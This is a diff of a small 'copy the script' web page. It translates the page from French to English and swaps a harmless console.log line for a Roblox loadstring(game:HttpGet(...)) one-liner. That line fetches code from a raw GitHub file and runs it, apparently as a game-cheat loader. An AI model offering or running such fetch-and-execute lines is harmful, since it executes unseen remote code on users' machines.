@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Script à copier</title>
+  <title>Script to Copy</title>
   <style>
     body {
       display: flex;
@@ -48,19 +48,19 @@
   </style>
 </head>
 <body>
-  <h2>Voici le script à copier :</h2>
+  <h2>Copy the script below:</h2>
   <pre id="scriptCode">
-console.log("Salut, c'est mon script !");
+loadstring(game:HttpGet("https://raw.githubusercontent.com/khen791/script-khen/refs/heads/main/Failurty.txt", true))();
   </pre>
-  <button onclick="copyScript()">Copier le script</button>
+  <button onclick="copyScript()">Copy Script</button>
 
   <script>
     function copyScript() {
       const code = document.getElementById('scriptCode').innerText.trim();
       navigator.clipboard.writeText(code).then(() => {
-        alert('Script copié dans le presse-papier !');
+        alert('Script copied to clipboard!');
       }).catch(() => {
-        alert('Impossible de copier le script.');
+        alert('Failed to copy the script.');
       });
     }
   </script>
